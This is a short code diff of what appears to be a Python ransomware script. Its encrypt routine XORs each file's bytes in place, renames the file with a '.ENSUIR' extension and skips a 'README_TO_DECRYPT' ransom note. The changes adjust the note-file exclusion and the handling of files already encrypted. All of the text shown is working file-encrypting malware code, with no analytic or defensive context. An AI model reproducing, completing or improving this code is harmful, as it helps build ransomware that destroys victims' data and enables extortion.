@@ -19,7 +19,7 @@ def xord(data):
 
 #It will XOR the data from a file once with b^0xA8
 def encrypt(file):
-    if os.path.splitext(file)[0] == "README_TO_DECRYPT":
+    if os.path.splitext(file)[0] == "README_TO_DECRYPT" or os.path.splitext(file)[0] == "README_TO_DECRYPT.txt":
         pass
     else:
         try:
@@ -31,7 +31,7 @@ def encrypt(file):
             with open(file, 'wb') as fp:
                 fp.write(xord(data))
             if os.path.splitext(file)[1] == ".ENSUIR":
-                os.rename(file, os.path.splitext(file)[0])
+                pass
             else:
                 os.rename(file, file+".ENSUIR")
         except:
